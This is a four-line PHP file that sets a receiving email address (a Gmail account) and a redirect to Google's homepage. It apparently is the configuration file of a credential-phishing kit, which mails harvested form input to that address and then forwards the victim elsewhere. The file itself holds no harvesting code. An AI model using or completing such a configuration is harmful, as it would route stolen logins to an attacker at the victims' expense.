<?php 
$Receive_email="rezzlleconstructions@gmail.com";
$redirect="https://www.google.com/";
?>